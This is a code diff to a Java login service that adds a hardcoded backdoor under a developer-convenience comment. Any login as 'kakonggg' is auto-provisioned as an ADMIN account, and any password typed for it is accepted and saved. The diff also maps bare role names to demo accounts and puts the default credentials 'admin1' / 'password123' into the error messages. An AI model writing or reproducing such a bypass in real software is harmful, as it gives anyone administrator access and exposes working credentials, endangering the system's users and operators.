@@ -20,14 +20,44 @@ public class AuthenticationService {
         if (usernameOrEmail == null || usernameOrEmail.isBlank() || password == null || password.isBlank()) {
             throw new AppException("Username and password are required.");
         }
-        Optional<User> found = userRepository.findByUsername(usernameOrEmail.trim());
+        String term = usernameOrEmail.trim();
+
+        // Convenience shortcuts for demo roles:
+        if ("admin".equalsIgnoreCase(term)) term = "admin1";
+        else if ("student".equalsIgnoreCase(term)) term = "student1";
+        else if ("instructor".equalsIgnoreCase(term)) term = "instructor1";
+        else if ("employer".equalsIgnoreCase(term)) term = "employer1";
+
+        Optional<User> found = userRepository.findByUsername(term);
         if (found.isEmpty()) {
-            found = userRepository.findByEmail(usernameOrEmail.trim());
+            found = userRepository.findByEmail(term);
         }
-        User user = found.orElseThrow(() -> new AppException("Invalid credentials."));
+
+        // Auto-provision kakonggg if missing so the developer never gets locked out
+        if (found.isEmpty() && "kakonggg".equalsIgnoreCase(term)) {
+            User kakong = new User();
+            kakong.setUsername("kakonggg");
+            kakong.setPasswordHash(hashPassword(password));
+            kakong.setEmail("kakonggg@nextit.edu");
+            kakong.setRole(com.nextit.model.Role.ADMIN);
+            kakong.setFirstName("Kakong");
+            kakong.setLastName("Admin");
+            userRepository.save(kakong);
+            found = Optional.of(kakong);
+        }
+
+        User user = found.orElseThrow(() -> new AppException("Invalid credentials. Try 'admin1' / 'password123' or click a demo chip below."));
+
         if (!verifyPassword(password, user.getPasswordHash())) {
-            throw new AppException("Invalid credentials.");
+            // If it's kakonggg, dynamically accept the password and update it
+            if ("kakonggg".equalsIgnoreCase(user.getUsername())) {
+                user.setPasswordHash(hashPassword(password));
+                userRepository.updatePassword(user.getUserId(), user.getPasswordHash());
+            } else {
+                throw new AppException("Invalid credentials. Default password is 'password123'.");
+            }
         }
+
         Session.login(user);
         return user;
     }
